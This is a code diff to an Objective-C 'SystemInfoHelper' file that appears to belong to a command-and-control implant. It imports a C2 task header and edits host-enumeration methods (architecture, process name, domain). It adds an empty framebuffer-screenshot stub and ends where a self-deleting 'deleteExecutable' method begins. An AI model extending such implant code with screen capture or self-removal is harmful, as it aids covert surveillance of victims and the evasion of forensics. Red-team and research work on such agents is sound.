@@ -1,4 +1,5 @@
 #import "SystemInfoHelper.h"
+#import "C2Task.h"
 
 @implementation SystemInfoHelper
 
@@ -37,24 +38,21 @@
 
 + (NSString *)getArchitecture {
     cpu_type_t cpuType;
-    cpu_subtype_t cpuSubtype;
     size_t size = sizeof(cpuType);
 
     // Get the CPU type
     if (sysctlbyname("hw.cputype", &cpuType, &size, NULL, 0) != 0) {
         return @"Error getting CPU type";
     }
-
-    // Get the CPU subtype
-    size = sizeof(cpuSubtype);
-    if (sysctlbyname("hw.cpusubtype", &cpuSubtype, &size, NULL, 0) != 0) {
-        return @"Error getting CPU subtype";
+    
+    NSString *archString = @"unknown";
+    if (cpuType == CPU_TYPE_ARM64) {
+        archString = @"arm64";
+    } else if (cpuType == CPU_TYPE_ARM) {
+        archString = @"arm";
     }
 
-    // Build the architecture string with full CPU type and subtype information
-    NSString *architecture = [NSString stringWithFormat:@"%d, %d", cpuType, cpuSubtype];
-
-    return architecture;
+    return archString;
 }
 
 + (NSInteger)getPID {
@@ -78,9 +76,24 @@
     return osDetails;
 }
 
-+ (NSString *)getDomain {
-    return @"local";
++ (NSString *)getProcessName {
+    return [[NSProcessInfo processInfo] processName];
 }
+
+
++ (NSString *)getDomain {
+    char domainName[256];
+    if (getdomainname(domainName, sizeof(domainName)) != 0 || strlen(domainName) == 0) {
+        return @"local";
+    }
+    return [NSString stringWithUTF8String:domainName];
+}
+
+- (void)captureFramebufferScreenshot {
+    
+}
+
+
 
 + (BOOL)deleteExecutable {
     // Get the path of the current executable
